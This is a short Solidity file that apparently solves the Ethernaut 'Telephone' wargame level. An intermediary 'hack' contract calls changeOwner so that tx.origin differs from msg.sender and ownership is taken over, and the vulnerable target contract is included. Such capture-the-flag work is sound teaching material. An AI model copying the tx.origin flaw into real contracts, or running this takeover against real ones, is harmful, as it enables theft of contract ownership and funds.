// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract hack {
    Telephone private immutable target;

    constructor(address _target) {
        target = Telephone(_target);
    }

    function attack(address _owner) public {
      target.changeOwner(_owner);

    }
}

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}